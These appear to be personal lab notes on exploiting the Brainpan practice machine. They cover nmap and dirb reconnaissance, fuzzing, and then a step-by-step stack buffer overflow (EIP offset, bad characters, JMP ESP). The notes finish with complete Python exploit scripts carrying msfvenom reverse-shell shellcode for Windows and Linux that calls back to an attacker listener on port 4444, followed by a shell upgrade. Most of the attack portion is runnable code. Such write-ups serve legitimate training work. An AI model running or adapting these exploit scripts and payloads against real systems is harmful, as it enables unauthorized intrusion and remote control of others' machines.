## Scanning

`nmap  -sn  192.168.69.100/24`
![4968c3349c6dcf24a34492aee42e58b6.png](../../../_resources/3c106cdeb28b4fa9a5eeae7ad1812a1e.png)

`nmap -T4 -p- -A 192.168.69.104`
![b0d695ca1a44d3cc7684c80e0d372ccb.png](../../../_resources/1b5e8edd1dda45bab01654d047dc24cf.png)


## Enumeration

![754f09cefc635037a1d869aeefd66d64.png](../../../_resources/29639ff557cc4f18be68de3b148b43d6.png)

![e42f43d689380dbea40187baf2b5fad1.png](../../../_resources/e8381a398e0d4bd78bce65853585e3bb.png)

`dirb http://192.168.69.104:10000 /usr/share/wordlists/dirb/common.txt` 
![58ca4947419b2f61cb7e15c9665fbfbd.png](../../../_resources/2c0308b8e5c04e808f6d579e71b9d877.png)

![2395216d2d9b89b471d5af43434c968d.png](../../../_resources/0906b9809a194cf5850afeb66fcb9886.png)

![f4ea7b3da535ffe9f4c0335e7572632a.png](../../../_resources/7085c3caf1c84f94a205f815ec72d047.png)

`strings Downloads/brainpan.exe` 
![1032d53b3c183822323b7d017e67945c.png](../../../_resources/c57c388a02cb4bc9b2f450418b2eaa79.png)

`file Downloads/brainpan.exe`
![888c3ff6f19a66eb2b356770412bc5ad.png](../../../_resources/4ce3497d273f4680a431b054427a23ab.png)

![c5fb599587e7d4c1d6cc5adf3a3d9806.png](../../../_resources/935a5f2062684f8a92640efb4ec856ff.png)

`nc -nv 192.168.69.101 9999`
![a5bccb2981932f2a47246bb458efc670.png](../../../_resources/170cd19b33a24a64bf9a5742d6533ac4.png)
![219febe29ab591a55eeba5ff12f828dc.png](../../../_resources/9b34d434766b4f22b3185f8d83cbb1b7.png)
![2a1f38a35c15d6733129f154951edd8b.png](../../../_resources/935db545c12d4b98b809d268d3ffbe84.png)

![00fd1b9a9a6c6458f76750f251c3cdbd.png](../../../_resources/f8de05508bf94098bb85d62404993f00.png)

![c40ebc3b35c9978e4df95f916a2474ca.png](../../../_resources/2238882e0d404b428b81b2211a3d9fed.png)


## Debugging

1. fuzzing
```
#!/usr/bin/python
import sys,socket 
address = '192.168.69.101'
port = 9999
buffer = ['\x41']
counter = 100
while len(buffer)<= 10:
	buffer.append('\x41'*counter)
	counter=counter+100
try:
	for string in buffer:	
		print '[+] Sending %s bytes...' % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect=s.connect((address,port))
		s.recv(1024)
		s.send(string + '\r\n')
		print '[+] Done'
except:
 	print '[!] Unable to connect to the application. You may have crashed it.'
 	sys.exit(0)
finally:
	s.close()
```
![de5f4c8f2a83d273b2657c3d6ace40e4.png](../../../_resources/b565345eab984584ba05e665d5ade53a.png)
![b1b97431555eded815d0dcfc8d6b0449.png](../../../_resources/1421b26ac2044f0d96b9897afbf9e4b4.png)

2. crashing
Replicating the crash in Immunity debigger

```
#!/usr/bin/python
import socket
import sys
from time import sleep

buffer = 'A' * 700		#change 600 accordingly

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
```

![436a0ad33050356f03454c2b3adaa001.png](../../../_resources/e8d7579d8bb945e0b402fc52e3bfb231.png)
![161e1bc8d5c8e053dd03774585c51f9a.png](../../../_resources/8000a9f69d84486bae08e0c00cfbd243.png)

3. finding the offset to EIP register
`msf-pattern_create -l 700`
![f3a50c8d00511a9aa5ca4c34c3372542.png](../../../_resources/31a6c14957a24ec49549f803a934012b.png)

```
import socket
import sys
from time import sleep

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A'

buffer = pattern

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![10f68236d57b16116f84f24352aaf281.png](../../../_resources/a01f2edca42b4ba1a6cbde658172928b.png)
![749454d2d150299fece5e3970b517604.png](../../../_resources/e1207e0ef7974da19a07b401ef4ca4f2.png)
`msf-pattern_offset -l 3000 -q 35724134`
![b80b421e33d2728f915b67de7f2a8ae7.png](../../../_resources/8d9472f8fc0e4a46bae5f668390f8255.png)

4. Controlling the EIP Register
```
import socket
import sys
from time import sleep

buffer = 'A' * 524 + 'B' * 4  + 'C' * 172 # 524 + 4 + 122 = 7000

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![ed4fe3aca81eff5df184df5057350aca.png](../../../_resources/3d522110e92043a181014fa9addaad65.png)
![c0b3f050c2f7b641ebf0a2c2dbcf3b2a.png](../../../_resources/d6791370244b48828884310a10256357.png)
![0719bd3efdaf4fe1a81bb9294907bed4.png](../../../_resources/9d5984c85d31463c8931225d68cb5077.png)
![546d250a9fff0cd39dd985a76842d9da.png](../../../_resources/fabbd32242884decbcc4b22b62fa151b.png)


5. Finding space for shellcode
```
import socket
import sys
from time import sleep

# buffer = 'A' * 524 + 'B' * 4  + 'C' * 122 # 524 + 4 + 122 = 650
buffer = 'A' * 524 + 'B' * 4  + 'C' * 522 # 122 + 400 = 522

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![3db49e61de4388bbd8f47a01e3cabb56.png](../../../_resources/0e8dae34f97b428498a863144434b387.png)
![716e357d12696afb680a3c540ed6f515.png](../../../_resources/547dee72ea5d47a9a515cf0209f24d96.png)

6. Finding Bad Characters
```
import socket
import sys
from time import sleep

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )


buffer = 'A' * 524 + 'B' * 4  + badchars

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![9575aa90096c102544fa269ba9f8a278.png](../../../_resources/7d5b37f656354eb9aeedcd88412edb74.png)
![e32a2fb892853121e0c7b0b55fdc8451.png](../../../_resources/7da7d4f3d71941c383c8b68c8408059e.png)

7. Jumping to the ESP Register
![69b1d813b8ff5981a9ee48b6ebd46432.png](../../../_resources/3c07560b32db41c197e3fa534a15a660.png)
![d8c4ab35c1b7f908f7fa8440229edef9.png](../../../_resources/ea9cbb0d53974ffd89b72d128850aa7f.png)
`!mona find -s “\xff\xe4” -m brainpan.exe`
This means JMP ESP
![439c5fa2c11b198cf078204ec2af4f2f.png](../../../_resources/160981cbe1a041a3ae17d45a9885aa1a.png)
![f1427b37b377ad00df34cb178609b89c.png](../../../_resources/b3be605b9004495d81c59c78141c2686.png)

```
import socket
import sys
from time import sleep

badchars = ()

buffer = 'A' * 524 + '\xF3\x12\x17\x31'  + 'C' * 522		# JMP ESP noted in little endian
# 311712F3 is in reverse order (memory)

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.69.101',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![7159c7145d255dcc555ce388dad6bb4a.png](../../../_resources/a7e0c9102e2e468c96070797b1335ca1.png)

8. Generating shell
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f c > shellcode.txt`

![e78148542d4f2ef2f12ab928e81a5497.png](../../../_resources/7eaf0dad34b84e4f81883a7c5e14a947.png)

```
import socket
import sys
from time import sleep

shellcode = ("\xdb\xca\xba\x39\xcc\xf8\x8e\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x50\x13\x03\x69\xdf\x1a\x7b\x75\x37\x58"
"\x84\x85\xc8\x3d\x0c\x60\xf9\x7d\x6a\xe1\xaa\x4d\xf8\xa7\x46"
"\x25\xac\x53\xdc\x4b\x79\x54\x55\xe1\x5f\x5b\x66\x5a\xa3\xfa"
"\xe4\xa1\xf0\xdc\xd5\x69\x05\x1d\x11\x97\xe4\x4f\xca\xd3\x5b"
"\x7f\x7f\xa9\x67\xf4\x33\x3f\xe0\xe9\x84\x3e\xc1\xbc\x9f\x18"
"\xc1\x3f\x73\x11\x48\x27\x90\x1c\x02\xdc\x62\xea\x95\x34\xbb"
"\x13\x39\x79\x73\xe6\x43\xbe\xb4\x19\x36\xb6\xc6\xa4\x41\x0d"
"\xb4\x72\xc7\x95\x1e\xf0\x7f\x71\x9e\xd5\xe6\xf2\xac\x92\x6d"
"\x5c\xb1\x25\xa1\xd7\xcd\xae\x44\x37\x44\xf4\x62\x93\x0c\xae"
"\x0b\x82\xe8\x01\x33\xd4\x52\xfd\x91\x9f\x7f\xea\xab\xc2\x17"
"\xdf\x81\xfc\xe7\x77\x91\x8f\xd5\xd8\x09\x07\x56\x90\x97\xd0"
"\x99\x8b\x60\x4e\x64\x34\x91\x47\xa3\x60\xc1\xff\x02\x09\x8a"
"\xff\xab\xdc\x1d\xaf\x03\x8f\xdd\x1f\xe4\x7f\xb6\x75\xeb\xa0"
"\xa6\x76\x21\xc9\x4d\x8d\xa2\x36\x39\xa6\x3a\xdf\x38\xb8\x2b"
"\x43\xb4\x5e\x21\x6b\x90\xc9\xde\x12\xb9\x81\x7f\xda\x17\xec"
"\x40\x50\x94\x11\x0e\x91\xd1\x01\xe7\x51\xac\x7b\xae\x6e\x1a"
"\x13\x2c\xfc\xc1\xe3\x3b\x1d\x5e\xb4\x6c\xd3\x97\x50\x81\x4a"
"\x0e\x46\x58\x0a\x69\xc2\x87\xef\x74\xcb\x4a\x4b\x53\xdb\x92"
"\x54\xdf\x8f\x4a\x03\x89\x79\x2d\xfd\x7b\xd3\xe7\x52\xd2\xb3"
"\x7e\x99\xe5\xc5\x7e\xf4\x93\x29\xce\xa1\xe5\x56\xff\x25\xe2"
"\x2f\x1d\xd6\x0d\xfa\xa5\xf6\xef\x2e\xd0\x9e\xa9\xbb\x59\xc3"
"\x49\x16\x9d\xfa\xc9\x92\x5e\xf9\xd2\xd7\x5b\x45\x55\x04\x16"
"\xd6\x30\x2a\x85\xd7\x10")


buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 139 
# 32 NO OPS are added as \x90
# c = 522-32-351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.43.30',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()
```

`nc -nvlp 4444 `

![0f58501e84e846ccacdeab170936be3a.png](../../../_resources/718959f3899b4c9d8bc675cea4176f18.png)
![76d51de3a8fa8e7c73dce591080d6f1b.png](../../../_resources/5ae1e1fd3dfb4d14aa6dfb92d726ff67.png)


## Exploitation

Moving to brainpan box
![dc33a2f0d68cc25e081d21556cb2399a.png](../../../_resources/09af96eafc594d6aa2169e0bea04ceef.png)

shell is running windows commands but has linux, maybe wine
![0e2f8a0148c60a1203577a49582dfed1.png](../../../_resources/51c10bfb406241cdaa4a5281bef5e037.png)

![d5b6253dfc6ea786863b06251658ced5.png](../../../_resources/25a1c00532704eb2a6a754657cfb12af.png)

![09b437c10c086978334071dbf4f8d5eb.png](../../../_resources/a5b7b10117c6464e80268ba8e9c59cbd.png)

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.43.8 LPORT=4444 EXITFUNC=thread -a x86 --platform linux -b "\x00" -f c > shellcode.txt`

## brainpan_exploit.py
```
import socket
import sys
from time import sleep

shellcode = ("\xda\xc4\xd9\x74\x24\xf4\xbd\x17\x07\x75\xb4\x58\x31\xc9\xb1"
"\x12\x31\x68\x17\x03\x68\x17\x83\xff\xfb\x97\x41\xce\xd8\xaf"
"\x49\x63\x9c\x1c\xe4\x81\xab\x42\x48\xe3\x66\x04\x3a\xb2\xc8"
"\x3a\xf0\xc4\x60\x3c\xf3\xac\xb2\x16\x28\x24\x5b\x65\x2f\x25"
"\xc7\xe0\xce\xf5\x91\xa2\x41\xa6\xee\x40\xeb\xa9\xdc\xc7\xb9"
"\x41\xb1\xe8\x4e\xf9\x25\xd8\x9f\x9b\xdc\xaf\x03\x09\x4c\x39"
"\x22\x1d\x79\xf4\x25")


buffer = 'A' * 524 + '\xF3\x12\x17\x31' + '\x90' * 32 + shellcode + 'C' * 139 
# 32 NO OPS are added as \x90
# c = 522-32-351

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('192.168.43.149',9999))
  s.recv(1024)

  print '[*] Sending buffer.'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[*] Could not connect to target, exiting.'
  sys.exit()

```
![c5be47dee56750a8921cd4959d122573.png](../../../_resources/7213ce04b25d41fbbd7eb458c5a4d143.png)

Spawn a better shell: `python3 -c 'import pty; pty.spawn("/bin/sh")'`

Privesc
![c7fce6d7a73c22038e65aa1dd4a014aa.png](../../../_resources/7720165e5bf94f3a99e4df3a9064191d.png)
![3c702b75b300938489518848a53daba3.png](../../../_resources/f50316ff673d44c39ba830047e5ac1cf.png)
